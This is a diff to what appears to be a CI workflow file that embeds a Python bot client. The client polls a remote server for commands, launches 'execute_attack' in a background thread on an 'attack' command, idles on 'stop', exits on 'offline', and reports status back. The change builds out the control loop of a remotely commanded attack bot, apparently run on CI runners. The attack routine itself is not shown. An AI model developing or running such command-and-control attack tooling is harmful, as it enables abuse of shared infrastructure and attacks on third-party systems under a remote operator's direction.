@@ -282,22 +282,37 @@ jobs:
               print("⏳ Waiting for commands...")
               print("="*60)
               
+              attack_thread = None
+              
               while True:
                   try:
                       command = poll_command()
                       
                       if command['type'] == 'attack':
-                          execute_attack(command)
-                          report_stats()
+                          # Start attack in a separate thread
+                          if attack_thread is None or not attack_thread.is_alive():
+                              attack_thread = threading.Thread(target=execute_attack, args=(command,))
+                              attack_thread.start()
+                      
                       elif command['type'] == 'stop':
-                          print("🛑 Stop command received")
+                          print("🛑 Stop command received - halting attacks")
+                          # Just stop attacking, don't exit
+                          stats['status'] = 'idle'
                           report_stats()
-                          break
+                          # Continue polling for new commands
+                      
+                      elif command['type'] == 'offline':
+                          print("⚠️ OFFLINE command received - shutting down")
+                          stats['status'] = 'offline'
+                          report_stats()
+                          break  # Exit the loop
                       
                       time.sleep(5)
+                  
                   except KeyboardInterrupt:
-                      print("\n⚠️  Interrupted by user")
+                      print("\n⚠️ Interrupted by user")
                       break
+                  
                   except Exception as e:
                       print(f"❌ Main loop error: {e}")
                       time.sleep(10)
